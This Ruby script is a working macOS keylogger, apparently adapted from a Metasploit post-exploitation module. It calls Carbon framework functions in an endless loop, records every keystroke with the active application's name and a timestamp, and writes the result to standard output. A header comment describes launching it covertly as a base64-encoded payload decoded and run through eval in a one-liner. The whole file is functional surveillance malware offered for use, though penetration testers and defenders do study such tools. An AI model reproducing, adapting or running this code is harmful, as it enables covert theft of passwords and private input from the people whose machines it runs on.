#!/usr/bin/ruby

# From https://github.com/gojhonny/metasploit-framework/blob/master/modules/post/osx/capture/keylog_recorder.rb
#   original author:  joev
#   license:          MSF_LICENSE
#   adaptation by:    @harmj0y

# to launch with a one-liner, # base64 -w 0 keylogger.rb > keylogger.b64 and
# => ruby -W0 -e "require 'base64';eval(Base64.decode64('BASE64_CODE'))" > keylog.txt

require 'thread'
require 'dl'
require 'dl/import'

#### Patches to DL (for compatibility between 1.8->1.9)
Importer = if defined?(DL::Importer) then DL::Importer else DL::Importable end
def ruby_1_9_or_higher?
  RUBY_VERSION.to_f >= 1.9
end
def malloc(size)
  if ruby_1_9_or_higher?
    DL::CPtr.malloc(size)
  else
    DL::malloc(size)
  end
end
# the old Ruby Importer defaults methods to downcase every import
# This is annoying, so we'll patch with method_missing
if not ruby_1_9_or_higher?
  module DL
    module Importable
      def method_missing(meth, *args, &block)
        str = meth.to_s
        lower = str[0,1].downcase + str[1..-1]
        if self.respond_to? lower
          self.send lower, *args
        else
          super
        end
      end
    end
  end
end

#### External dynamically linked code
SM_KCHR_CACHE = 38
SM_CURRENT_SCRIPT = -2
MAX_APP_NAME = 80
module Carbon
  extend Importer
  dlload '/System/Library/Frameworks/Carbon.framework/Carbon'
  extern 'unsigned long CopyProcessName(const ProcessSerialNumber *, void *)'
  extern 'void GetFrontProcess(ProcessSerialNumber *)'
  extern 'void GetKeys(void *)'
  extern 'unsigned char *GetScriptVariable(int, int)'
  extern 'unsigned char KeyTranslate(void *, int, void *)'
  extern 'unsigned char CFStringGetCString(void *, void *, int, int)'
  extern 'int CFStringGetLength(void *)'
end
psn = malloc(16)
name = malloc(16)
name_cstr = malloc(MAX_APP_NAME)
keymap = malloc(16)
state = malloc(8)

#### Actual Keylogger code
itv_start = Time.now.to_i
prev_down = Hash.new(false)
lastWindow = ""

while (true) do
  Carbon.GetFrontProcess(psn.ref)
  Carbon.CopyProcessName(psn.ref, name.ref)
  Carbon.GetKeys(keymap)
  str_len = Carbon.CFStringGetLength(name)
  copied = Carbon.CFStringGetCString(name, name_cstr, MAX_APP_NAME, 0x08000100) > 0
  app_name = if copied then name_cstr.to_s else 'Unknown' end

  bytes = keymap.to_str

  cap_flag = false
  ascii = 0
  ctrlchar = ""
  (0...128).each do |k|
    # pulled from apple's developer docs for Carbon#KeyMap/GetKeys
    # puts (bytes[k >> 3].ord & (1 <<(k&7)))
    if ((bytes[k>>3].ord >> (k&7)) & 1 > 0)
      if not prev_down[k]
        case k
          when 36
            ctrlchar = "[enter]"
          when 48
            ctrlchar = "[tab]"
          when 49
            ctrlchar = " "
          when 51
            ctrlchar = "[delete]"
          when 53
            ctrlchar = "[esc]"
          when 55
            ctrlchar = "[cmd]"
          when 56
            ctrlchar = "[shift]"
          when 57
            ctrlchar = "[caps]"
          when 58
            ctrlchar = "[option]"
          when 59
            ctrlchar = "[ctrl]"
          when 63
            ctrlchar = "[fn]"
          else
            ctrlchar = ""
        end

        if ctrlchar == "" and ascii == 0
          kchr = Carbon.GetScriptVariable(SM_KCHR_CACHE, SM_CURRENT_SCRIPT)
          curr_ascii = Carbon.KeyTranslate(kchr, k, state)
          curr_ascii = curr_ascii >> 16 if curr_ascii < 1
          prev_down[k] = true
          if curr_ascii == 0
            cap_flag = true
          else
            ascii = curr_ascii
          end
        elsif ctrlchar != ""
          prev_down[k] = true
        end

      end
    else
      prev_down[k] = false
    end
  end

  if ascii != 0 or ctrlchar != ""

    # only display 
    if app_name != lastWindow
      puts "\n\n[#{app_name}] - [#{Time.now}]\n"
      lastWindow = app_name
    end

    if ctrlchar != ""
      print "#{ctrlchar}"
    elsif ascii > 32 and ascii < 127
      c = if cap_flag then ascii.chr.upcase else ascii.chr end
      print "#{c}"
    else
      print "[#{ascii}]"
    end
    $stdout.flush

  end
  Kernel.sleep(0.01)
end
